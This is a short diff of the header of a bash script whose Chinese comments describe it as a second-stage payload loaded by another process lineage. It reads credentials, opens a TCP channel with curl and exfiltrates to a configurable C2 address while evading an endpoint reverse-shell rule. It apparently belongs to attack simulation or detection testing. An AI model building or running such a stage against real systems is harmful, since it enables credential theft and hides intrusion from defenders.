@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # apt-staged-drop 二阶段载荷：被【另一条 lineage】加载执行（与落盘错峰、跨谱系）。
-# 真实行为：读凭据 + 由 curl 建立 TCP 通道 + 外发，避免命中 endpoint reverse-shell terminal。
+# 真实行为：读凭据 + 由 curl 建立 TCP 通道 + 外发，避免命中 Endpoint reverse-shell Rule Conclusion。
 C2_IP="${C2_IP:-10.66.0.99}"
 C2_PORT="${C2_PORT:-443}"
 # 解析 --report http://host:port（取其端口；默认 443）
